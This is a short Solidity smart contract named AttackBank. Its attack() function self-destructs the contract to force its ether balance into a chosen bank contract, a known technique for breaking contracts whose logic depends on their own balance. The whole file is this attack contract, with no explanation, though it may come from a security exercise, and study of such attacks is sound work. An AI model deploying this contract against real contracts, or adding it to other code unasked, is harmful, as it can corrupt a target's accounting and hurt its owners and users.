// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.30;

contract AttackBank {

    address payable private bankAddr;

    constructor(address payable _bankAddr) {
        bankAddr = _bankAddr;
    }

    receive() external payable { }

    function attack() external {
        selfdestruct(bankAddr);
    }    
}
